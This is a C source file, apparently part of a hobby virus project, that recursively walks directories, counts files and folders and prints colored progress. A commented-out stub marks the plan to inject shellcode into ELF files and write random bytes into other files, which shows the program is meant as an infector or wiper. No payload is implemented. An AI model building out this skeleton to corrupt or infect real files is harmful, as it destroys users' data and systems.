// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains all the operations that are being performed on directories


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>


#include "color.h"

#include "operations.h"



long int dir_count = 0;
long int file_count = 0;


void DirEntriesParse(char *location)
{

	struct dirent *dp;


    // open up directory
    DIR *dirptr = opendir(location);
	if ( dirptr == NULL )
	{
		perror(RED"[-]"YELLOW" 2_dir_operations.c:"RESET" While 'DirEntriesParse' in opendir(): ");
		exit(0x30);		
	}



    // Read directory entries reccursively until end of directory entries
    while ( (dp = readdir(dirptr)) != NULL)
    {

		// get filetype of this particular directory entry
		const char *filetype = GetFileType(location, dp->d_name);			


		// If entry is a "Regular file"
		if ( strncmp(filetype, "Regular file", 12) == 0 )
		{
			++file_count;
			char *filename = GetAbsPath(location, dp->d_name);
/*		
			if ( IsELF(filename) )
			{
				// inject shellcode
			}

			else
			{
				// Write random bytes in file
			}
*/		}


		// If entry is a "Directory" parse again
		if ( strncmp(filetype, "Directory", 9) == 0 )
		{
			// buffer to pass on absolute path for next directory parsing
			char temp_buffer[1000];	
			

			// Ignore current and parent directory		
			if ( strcmp(dp->d_name, "." ) == 0 || strncmp(dp->d_name, "..", 2) == 0 )
				continue;


            // keep track of how many directories have been parsed
            ++dir_count;

			
			char *dirpath = GetAbsPath(location, dp->d_name);
			fprintf(stdout, BOLDGREEN"[+]"RESET" Entering"BLUE" %s ...\n"RESET, dirpath);
			DirEntriesParse( dirpath );
		}
	}



	fprintf(stdout, GREEN"[+]"RESET" Parsed %ld directories\n", dir_count);
	fprintf(stdout, GREEN"[+]"RESET" Parsed %ld files\n", file_count);

	// Prevent resource leak
    closedir(dirptr);
}



